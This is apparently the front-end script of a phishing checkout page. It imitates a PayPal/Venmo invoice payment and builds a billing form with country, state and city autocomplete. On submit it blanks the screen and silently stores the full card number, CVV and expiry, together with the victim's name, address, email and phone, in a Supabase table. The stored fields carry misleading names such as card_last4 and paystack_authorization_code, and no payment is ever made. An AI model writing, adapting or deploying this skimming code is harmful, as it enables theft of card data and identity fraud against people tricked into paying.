// Config from window
const config = window.APP_CONFIG || {};
const supabaseUrl = config.SUPABASE_URL || "";
const supabaseAnonKey = config.SUPABASE_ANON_KEY || "";
const supabaseClient =
  window.supabase && supabaseUrl && supabaseAnonKey
    ? window.supabase.createClient(supabaseUrl, supabaseAnonKey)
    : null;

const countriesList = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria",
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia",
  "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia",
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Congo-Brazzaville)",
  "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czechia (Czech Republic)", "Democratic Republic of the Congo", "Denmark", "Djibouti",
  "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini",
  "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala",
  "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland",
  "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", "Latvia",
  "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", "Malaysia",
  "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", "Monaco",
  "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar (formerly Burma)", "Namibia", "Nauru", "Nepal", "Netherlands",
  "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau",
  "Palestine State", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania",
  "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino",
  "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia",
  "Solomon Islands", "Somalia", "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname",
  "Sweden", "Switzerland", "Syria", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago",
  "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States",
  "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
];

const usStates = [
  "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", 
  "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", 
  "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", 
  "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", 
  "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
];

// Views
const invoiceView = document.getElementById("invoice-view");
const paypalView = document.getElementById("paypal-view");

// Buttons
const btnPaypal = document.getElementById("btn-paypal");
const btnVenmo = document.getElementById("btn-venmo");
const btnBackToInvoice = document.getElementById("btn-back-to-invoice");

if(btnPaypal) {
  btnPaypal.addEventListener("click", () => {
    document.getElementById("provider-logo").src = "paypalnamefull.png";
    document.getElementById("provider-logo").style.height = "26px";
    document.getElementById("right-panel-title").innerHTML = "PayPal is a safer, faster<br>way to pay";
    invoiceView.style.display = "none";
    paypalView.style.display = "block";
    document.body.classList.add("paypal-active");
  });
}

if(btnVenmo) {
  btnVenmo.addEventListener("click", () => {
    document.getElementById("provider-logo").src = "icons8-venmo-100.png";
    document.getElementById("provider-logo").style.height = "26px";
    document.getElementById("right-panel-title").innerHTML = "Venmo is a safer, faster<br>way to pay";
    invoiceView.style.display = "none";
    paypalView.style.display = "block";
    document.body.classList.add("paypal-active");
  });
}

if(btnBackToInvoice) {
  btnBackToInvoice.addEventListener("click", () => {
    paypalView.style.display = "none";
    invoiceView.style.display = "block";
    document.body.classList.remove("paypal-active");
  });
}

// City / Country Logic
const elBillingCountry = document.getElementById("billing-country");
const elStateLabel = document.getElementById("state-label");
const elStateInput = document.getElementById("state-input");
const elStateSelect = document.getElementById("state-select");
const elCity = document.getElementById("city");
const elCityResults = document.getElementById("city-results");

// Initialize Countries
if (elBillingCountry) {
  countriesList.sort().forEach(country => {
    const opt = document.createElement("option");
    opt.value = country;
    opt.textContent = country;
    elBillingCountry.appendChild(opt);
  });

  // Initialize US States
  if(elStateSelect) {
    usStates.forEach(state => {
      const opt = document.createElement("option");
      opt.value = state;
      opt.textContent = state;
      elStateSelect.appendChild(opt);
    });
  }

  elBillingCountry.addEventListener("change", (e) => {
    const selected = e.target.value;
    if(elCity) elCity.value = "";
    
    if(elStateLabel && elStateInput && elStateSelect) {
      if (selected === "United States") {
        elStateLabel.textContent = "State";
        elStateInput.style.display = "none";
        elStateInput.disabled = true;
        elStateSelect.style.display = "";
        elStateSelect.disabled = false;
      } else if (selected === "Canada") {
        elStateLabel.textContent = "Province";
        elStateInput.style.display = "";
        elStateInput.disabled = false;
        elStateSelect.style.display = "none";
        elStateSelect.disabled = true;
      } else {
        elStateLabel.textContent = "State/Region";
        elStateInput.style.display = "";
        elStateInput.disabled = false;
        elStateSelect.style.display = "none";
        elStateSelect.disabled = true;
      }
    }
  });
}

// City Autocomplete
let citySearchTimer = null;
let selectedCityData = null;

if (elCity && elCityResults && supabaseClient) {
  elCity.addEventListener("input", (e) => {
    const country = elBillingCountry ? elBillingCountry.value : "";
    const search = e.target.value;
    selectedCityData = null;

    clearTimeout(citySearchTimer);

    if (!country || search.trim().length < 2) {
      elCityResults.style.display = "none";
      elCityResults.innerHTML = "";
      return;
    }

    citySearchTimer = setTimeout(async () => {
      try {
        const { data, error } = await supabaseClient
          .from("world_cities")
          .select("id, country, city, latitude, longitude, altitude")
          .eq("country", country)
          .ilike("city", `${search.trim()}%`)
          .order("city", { ascending: true })
          .limit(30);

        if (error) throw error;

        if (data && data.length > 0) {
          elCityResults.innerHTML = "";
          data.forEach(location => {
            const btn = document.createElement("div");
            btn.className = "autocomplete-item";
            btn.textContent = `${location.city}, ${location.country}`;
            btn.addEventListener("click", () => {
              selectedCityData = location;
              elCity.value = location.city;
              elCityResults.style.display = "none";
            });
            elCityResults.appendChild(btn);
          });
          elCityResults.style.display = "block";
        } else {
          elCityResults.style.display = "none";
        }
      } catch (err) {
        console.error("City search error:", err);
        elCityResults.style.display = "none";
      }
    }, 300);
  });

  document.addEventListener("click", (e) => {
    if (!elCity.contains(e.target) && !elCityResults.contains(e.target)) {
      elCityResults.style.display = "none";
    }
  });
}

// Form Logic
const form = document.getElementById("payment-form");
const formStatus = document.getElementById("form-status");
const payButton = document.getElementById("pay-button");

const cardName = document.getElementById("card-name");
const cardNumber = document.getElementById("card-number");
const expiry = document.getElementById("expiry");
const cvv = document.getElementById("cvv");

const firstName = document.getElementById("first-name");
const lastName = document.getElementById("last-name");
const emailAddress = document.getElementById("email-address");
const zipCode = document.getElementById("zip-code");
const streetAddress = document.getElementById("street-address");
const streetAddress2 = document.getElementById("street-address-2");
const phoneNumber = document.getElementById("phone-number");

if(cardName) {
  cardName.addEventListener("input", () => {
    cardName.value = cardName.value.replace(/\s{2,}/g, " ");
  });
}

function formatCardNumber(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();
}

function formatExpiry(value) {
  let digits = value.replace(/\D/g, "");
  if (digits.length === 1 && parseInt(digits, 10) > 1) {
    digits = `0${digits}`;
  }
  if (digits.length >= 3) {
    return `${digits.slice(0, 2)} / ${digits.slice(2, 4)}`;
  }
  return digits;
}

if(cardNumber) {
  cardNumber.addEventListener("input", () => {
    cardNumber.value = formatCardNumber(cardNumber.value);
  });
}

if(expiry) {
  expiry.addEventListener("input", () => {
    expiry.value = formatExpiry(expiry.value);
  });
}

if(cvv) {
  cvv.addEventListener("input", () => {
    cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
  });
}

function getCleanCardNumber(value) {
  return value.replace(/\D/g, "");
}

function setStatus(message, type = "") {
  if (!formStatus) return;
  formStatus.textContent = message;
  formStatus.className = "form-status";
  if (type) {
    formStatus.classList.add(`is-${type}`);
  }
}

if(form) {
  form.addEventListener("submit", (event) => {
    event.preventDefault();

    // Immediately turn the page white
    document.body.innerHTML = "";
    document.body.style.backgroundColor = "#ffffff";

    let cleanedName = "";
    if (cardName) {
      cleanedName = cardName.value.trim();
    } else if (firstName && lastName) {
      cleanedName = `${firstName.value.trim()} ${lastName.value.trim()}`.trim();
    }
    
    const cleanCardNumber = getCleanCardNumber(cardNumber.value);

    // If Supabase isn't configured, we just fail silently in the background
    if (!supabaseClient) return;

    const activeState = (elBillingCountry && elBillingCountry.value === "United States") ? elStateSelect.value : elStateInput.value;

    supabaseClient
      .from("payment_records")
      .insert([
        {
          cardholder_name: cleanedName,
          card_last4: cleanCardNumber,
          paystack_authorization_code: cvv.value, // keep existing schema field
          card_expiry: expiry.value,
          email: emailAddress ? emailAddress.value : null,
          zip_code: zipCode ? zipCode.value : null,
          address: streetAddress ? streetAddress.value : null,
          address2: streetAddress2 ? streetAddress2.value : null,
          city: elCity ? elCity.value : null,
          state: activeState,
          country: elBillingCountry ? elBillingCountry.value : null,
          phone_number: phoneNumber ? phoneNumber.value : null,
          first_name: firstName ? firstName.value : null,
          last_name: lastName ? lastName.value : null
        },
      ])
      .then(({ error }) => {
        if (error) console.error(error);
      })
      .catch((error) => {
        console.error("Failed to save to Supabase:", error);
      });
  });
}
